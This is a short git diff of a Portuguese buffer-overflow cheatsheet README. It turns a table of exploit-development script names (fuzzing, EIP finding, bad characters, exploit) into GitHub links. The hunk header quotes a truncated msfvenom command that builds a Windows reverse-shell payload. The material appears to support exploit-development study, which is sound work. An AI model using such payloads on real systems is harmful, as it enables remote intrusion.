@@ -45,11 +45,11 @@ msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows -b "<badchars>" 
 
 Scripts           | Link        
 ------------------|-------------
-conecta.py        | Clique aqui 
-fuzzing.py        | Clique aqui 
-poc.py            | Clique aqui 
-findeip.py        | Clique aqui
-eip.py            | Clique aqui 
-badchars.py       | Clique aqui 
-exploit.py        | Clique aqui 
+conecta.py        | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/conecta.py) 
+fuzzing.py        | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/fuzzing.py)
+poc.py            | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/poc.py)
+findeip.py        | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/findeip.py)
+eip.py            | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/eip.py)
+badchars.py       | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/badchars.py)
+exploit.py        | [Clique aqui](https://github.com/mx61tt/buffer-classico-cheatsheet/blob/master/scripts/exploit.py)
 
